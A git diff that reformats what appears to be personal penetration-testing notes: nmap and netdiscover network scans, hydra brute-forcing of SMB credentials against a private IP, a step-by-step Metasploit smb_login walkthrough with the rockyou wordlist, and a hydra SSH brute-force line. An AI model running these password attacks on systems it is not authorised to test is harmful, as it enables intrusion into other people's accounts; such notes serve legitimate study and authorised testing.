@@ -1,10 +1,10 @@
 # Scanning
 
-## netdiscover
+## Netdiscover
 ```console
 netdiscover -r x.x.x.1/24
 ```
-## nmap
+## Nmap
 ```console
 nmap -sP x.x.x.1/24                 
 nmap -sn x.x.x.1/24
@@ -14,22 +14,27 @@ Nmap -Pn -p 3389 target > rdp  // grep -B 5 open rdp
 Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql
 ```
 
-==== Crack SMB credentials ====
+# Credentials SMB Cracking
 
-1) hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+## Hydra
 
-2) Metasploit
+```console
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+```
 
+## Metasploit
+
+```console
 For Cracking SMB Password:
-•	we need to make folder -> store wordlist into that -> run msf from that folder | This process makes your work even better and smooth.
-•	>msfconsole .
-•	>use auxiliary/scanner/smb/smb_login
-•	>show option | To get an idea of what to set on
-•	>set PASS_FILE ./ROKYOU.TXT
-•	>set rhost {target IP address} | notes :- rhost means remote host
-•	>set SMBUser name [of the user] | (generally Administrator is username)
-•	>run
-
+we need to make folder -> store wordlist into that -> run msf from that folder | This process makes your work even better and smooth.
+>msfconsole .
+>use auxiliary/scanner/smb/smb_login
+>show option | To get an idea of what to set on
+>set PASS_FILE ./ROKYOU.TXT
+>set rhost {target IP address} | notes :- rhost means remote host
+>set SMBUser name [of the user] | (generally Administrator is username)
+>run
+```
 === Bruteforce SSH, TELNET, FTP  ===
 
 hydra -l username -P passlist.txt x.x.x.x ssh
